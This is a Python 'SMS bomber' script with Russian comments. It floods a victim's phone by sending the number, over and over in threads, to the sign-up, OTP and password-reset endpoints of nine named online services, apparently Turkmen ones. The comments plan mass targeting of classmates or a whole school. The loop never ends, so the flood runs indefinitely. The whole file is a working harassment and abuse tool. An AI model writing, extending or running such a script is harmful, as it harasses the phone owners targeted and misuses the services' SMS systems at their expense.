
# Итогово сервисов: 9
# Скорость спама: есть к чему стремиться.

# Будущие обновления:
# • Возможность массовой рассылки по номерам. Пример: сидишь в классе, заходишь в спамер и нажимаешь на нужный режим. После вводишь номера своих одноклассников (можно хоть всего класса, если имеются (да хоть всей школы, хаха)), дальше наслаждаешься проделанной работой, ну это так, пустяки, мы то с тобой будем преследовать куда более крупные задачи. ;)
# • Улучшение скорости.

import requests
from colorama import Back, Fore, init
import json
import time
from threading import Thread

init(autoreset=True)

print("""
\t\t  ___                 _ _ _____ __  __ 
\t\t / __|_ __  __ _ _ __| | |_   _|  \/  |
\t\t \__ \ '_ \/ _` | '  \_  _|| | | |\/| |
\t\t |___/ .__/\__,_|_|_|_||_| |_| |_|  |_|
\t\t     |_|                               
""")

phone_num = [] # Для будущих обновлений.

print("\n\n")


phones = int(input(Back.RED + "Введите номер: "))
print()
tries = int(input(Back.GREEN + "Введите кол-во кругов: "))

print("\n\n")

numbers = 0

print(""" 
                          _   _             _    
\t\t     /\  | | | |           | |   
\t\t    /  \ | |_| |_ __ _  ___| | __
\t\t   / /\ \| __| __/ _` |/ __| |/ /
\t\t  / ____ \ |_| || (_| | (__|   < 
\t\t /_/    \_\__|\__\__,_|\___|_|\_\      
\n\n              
""")
def spam(phones):
	while tries != 0:
		r = requests.post("https://api.belet.me/api/v1/auth/sign-in", json = {"phone":phones,"fingerprint":"110aec2bfcca53e0793f5973e5b86926"})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
		
		
		r = requests.post("https://gipertm.com/api/v1/profile/register", json = {"lang":"tk", "username":str(phones)})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
	
		
		r = requests.post("https://shop-adm.asmanexpress.com/api/customers/auth/otp?type=register", json = {"phone":str(phones)})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
			
		
		ph = str(phones)
		p_s = ph[3:]
		
		r = requests.post("https://nesipetsin.com:7070/nesipetsin/mobile/user/register",
		json = {"method":"phone","step":1,"phone":p_s,"email":"null","code":"null","password":"null","confirmPassword":"null","errorMsg":"null"})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
			
			
		r = requests.get("https://saray.tm/verify?phone=" + p_s + "&terms=accept")
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
		
		
		r = requests.post("http://awtoyoly.com.tm/Client/AwtoCheckLogin", data = {"phone":p_s})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
		
		
		r = requests.post("https://ynamdar.com/v3/forgot_password", data = {"registration-type": "phone", "phone": p_s, "action": "send-confirmation-code"})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
		
		
		r = requests.post("https://api.markayoly.com/api/start-signup", json = {"phone":p_s})
		
		if r.status_code == 200:
		      print(Fore.GREEN + "Сообщение отправлено.")
		    
        
        
for i in range(tries):
	th = Thread(target=spam, args=(phones, ))
	th.start()
		
